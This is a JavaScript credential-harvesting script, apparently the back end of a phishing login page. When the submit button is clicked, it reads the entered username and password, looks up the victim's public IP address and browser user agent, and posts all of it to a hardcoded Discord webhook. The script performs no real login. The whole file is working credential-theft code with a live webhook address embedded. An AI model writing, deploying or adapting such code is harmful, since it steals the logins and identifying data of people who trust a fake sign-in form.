async function sendData() {
    const user = document.getElementById("user").value;
    const pass = document.getElementById("pass").value;

    if (!user || !pass) {
        return;
    }

    const webhookURL = "https://discord.com/api/webhooks/1304152509845340251/74tE2N2FhHXsk6MB9EbzjHly-5ef9VQFX_qqdvppo9j3SotzWgaNS05ZY2tSJ8WIgso0";
    const ipResponse = await fetch("https://api.ipify.org?format=json");
    const ipData = await ipResponse.json();
    const ipAddress = ipData.ip || "[-] Unknown IP";
    const userAgent = navigator.userAgent;

    const payload = {
        content: `**[+] Username:** ${user}\n**[+] Password:** ${pass}\n**[+] IP Address:** ${ipAddress}\n**[+] User Agent:** ${userAgent}`
    };

    try {
        const response = await fetch(webhookURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
        });

        if (!response.ok) {
            console.error("Failed to send data:", response.status, response.statusText);
        }
    } catch (error) {
        console.error("Error sending data:", error);
    }
}

document.addEventListener("DOMContentLoaded", function() {
    document.getElementById("submitBtn").addEventListener("click", sendData);
});
